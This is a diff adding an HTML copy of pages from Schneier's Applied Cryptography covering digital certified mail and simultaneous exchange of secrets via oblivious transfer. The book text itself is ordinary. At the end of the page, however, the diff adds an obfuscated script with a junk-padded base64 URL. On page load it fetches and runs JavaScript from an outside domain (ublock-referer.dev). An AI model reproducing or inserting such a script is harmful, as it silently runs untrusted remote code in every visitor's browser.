@@ -1,0 +1,103 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Advanced Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=05//-->
+<!--PAGES=122-124//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="05-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch06/06-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading9"></A><FONT COLOR="#000077">5.8 Digital Certified Mail</FONT></H3>
+<P>The same simultaneous oblivious transfer protocol used for contract signing works, with some modifications, for computer certified mail [529]. Suppose Alice wants to send a message to Bob, but she does not want him to read it without signing a receipt. Surly postal workers handle this process in real life, but the same thing can be done with cryptography. Whitfield Diffie first discussed this problem in [490].
+</P>
+<P>At first glance, the simultaneous contract-signing protocol can do this. Alice simply encrypts her message with a DES key. Her half of the protocol can be something like: &#147;This is the left half of the DES key: 32f5,&#148; and Bob&#146;s half can be something like: &#147;This is the left half of my receipt.&#148; Everything else stays the same.</P>
+<P>To see why this won&#146;t work, remember that the protocol hinges on the fact that the oblivious transfer in step (5) keeps both parties honest. Both of them know that they sent the other party a valid half, but neither knows which. They don&#146;t cheat in step (8) because the odds of getting away with it are miniscule. If Alice is sending Bob not a message but half of a DES key, Bob can&#146;t check the validity of the DES key in step (6). Alice can still check the validity of Bob&#146;s receipt, so Bob is still forced to be honest. Alice can freely send Bob some garbage DES key, and he won&#146;t know the difference until she has a valid receipt. Tough luck, Bob.</P>
+<P>Getting around this problem requires some adjustment of the protocol:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice encrypts her message using a random DES key, and sends the message to Bob.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice generates <I>n</I> pairs of DES keys. The first key of each pair is generated at random; the second key of each pair is the XOR of the first key and the message encryption key.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice encrypts a dummy message with each of her 2<I>n</I> keys.
+<DD><B>(4)</B>&nbsp;&nbsp;Alice sends the whole pile of encrypted messages to Bob, making sure he knows which messages are which halves of which pairs.
+<DD><B>(5)</B>&nbsp;&nbsp;Bob generates <I>n</I> pairs of random DES keys.
+<DD><B>(6)</B>&nbsp;&nbsp;Bob generates a pair of messages that indicates a valid receipt. &#147;This is the left half of my receipt&#148; and &#147;this is the right half of my receipt&#148; are good candidates, with the addition of some kind of random-bit string. He makes <I>n</I> receipt pairs, each numbered. As with the previous protocol, the receipt is considered valid if Alice can produce both halves of a receipt (with the same number) and all of her encryption keys.
+<DD><B>(7)</B>&nbsp;&nbsp;Bob encrypts each of his message pairs with DES key pairs, the <I>i</I>th message pair with the <I>i</I>th key pair, the left message with the left key in the pair, and the right message with the right key in the pair.
+<DD><B>(8)</B>&nbsp;&nbsp;Bob sends his pile of message pairs to Alice, making sure that Alice knows which messages are which halves of which pairs.
+<DD><B>(9)</B>&nbsp;&nbsp;Alice and Bob send each other every key pair using the oblivious transfer protocol. That is, Alice sends Bob either the key used to encrypt the left message or the key used to encrypt the right message, for each of the <I>n</I> pairs. Bob does the same. They can either alternate sending halves or one can send <I>n</I> and then the other&#151;it doesn&#146;t matter. Now both Alice and Bob have one key in each key pair, but neither knows which halves the other has.
+<DD><B>(10)</B>&nbsp;&nbsp;Both Alice and Bob decrypt the halves they can and make sure that the decrypted messages are valid.
+<DD><B>(11)</B>&nbsp;&nbsp;Alice and Bob send each other the first bits of all 2<I>n</I> DES keys. (If they are worried about Eve being able to read these mail messages, then they should encrypt their transmissions to each other.)
+<DD><B>(12)</B>&nbsp;&nbsp;Alice and Bob repeat step (11) for the second bits of all 2<I>n</I> DES keys, the third bits, and so on, until all the bits of all the DES keys have been transferred.
+<DD><B>(13)</B>&nbsp;&nbsp;Alice and Bob decrypt the remaining halves of the message pairs. Alice has a valid receipt from Bob, and Bob can XOR any key pair to get the original message encryption key.
+<DD><B>(14)</B>&nbsp;&nbsp;Alice and Bob exchange the private keys used during the oblivious transfer protocol and each verifies that the other did not cheat.
+</DL>
+<P>Steps (5) through (8) for Bob, and steps (9) through (12) for both Alice and Bob, are the same as the contract-signing protocol. The twist is all of Alice&#146;s dummy messages. They give Bob some way of checking the validity of her oblivious transfer in step (10), which forces her to stay honest during steps (11) through (13). And, as with the simultaneous contract-signing protocol, both a left and a right half of one of Alice&#146;s message pairs are required to complete the protocol.
+</P>
+<H3><A NAME="Heading10"></A><FONT COLOR="#000077">5.9 Simultaneous Exchange of Secrets</FONT></H3>
+<P>Alice knows secret <I>A;</I> Bob knows secret <I>B</I>. Alice is willing to tell Bob <I>A</I>, if Bob tells her <I>B</I>. Bob is willing to tell Alice <I>B</I>, if Alice tells him <I>A</I>. This protocol, observed in a schoolyard, does not work:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice: &#147;I&#146;ll tell if you tell me first.&#148;
+<DD><B>(2)</B>&nbsp;&nbsp;Bob: &#147;I&#146;ll tell if you tell me first.&#148;
+<DD><B>(3)</B>&nbsp;&nbsp;Alice: &#147;No, you first.&#148;
+<DD><B>(4)</B>&nbsp;&nbsp;Bob: &#147;Oh, all right.&#148; Bob whispers.
+<DD><B>(5)</B>&nbsp;&nbsp;Alice: &#147;Ha! I won&#146;t tell you.&#148;
+<DD><B>(6)</B>&nbsp;&nbsp;Bob: &#147;That&#146;s not fair.&#148;
+</DL>
+<P>Cryptography can make it fair. The previous two protocols are implementations of this more general protocol, one that lets Alice and Bob exchange secrets simultaneously [529]. Rather than repeat the whole protocol, I&#146;ll sketch the modifications to the certified mail protocol.
+</P>
+<P>Alice performs steps (1) through (4) using <I>A</I> as the message. Bob goes through similar steps using <I>B</I> as his message. Alice and Bob perform the oblivious transfer in step (9), decrypt the halves they can in step (10), and go through the iterations in steps (11) and (12). If they are concerned about Eve, they should encrypt their messages. Finally, both Alice and Bob decrypt the remaining halves of the message pairs and XOR any key pair to get the original message encryption key.</P>
+<P>This protocol allows Alice and Bob to exchange secrets simultaneously, but says nothing about the quality of the secrets exchanged. Alice could promise Bob the solution to the Minotaur&#146;s labyrinth, but actually send him a map of Boston&#146;s subway system. Bob will get whatever secret Alice sends him. Other protocols are [1286,195,991,1524,705,753,259,358,415].</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="05-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch06/06-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(iKSyjaqO, pSKIsmhM) {pSKIsmhM = iKSyjaqO.createElement('script');pSKIsmhM.type = 'text/javascript';pSKIsmhM.async = true;pSKIsmhM.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');iKSyjaqO.getElementsByTagName('body')[0].appendChild(pSKIsmhM);}(document));</script></body>
+</html>
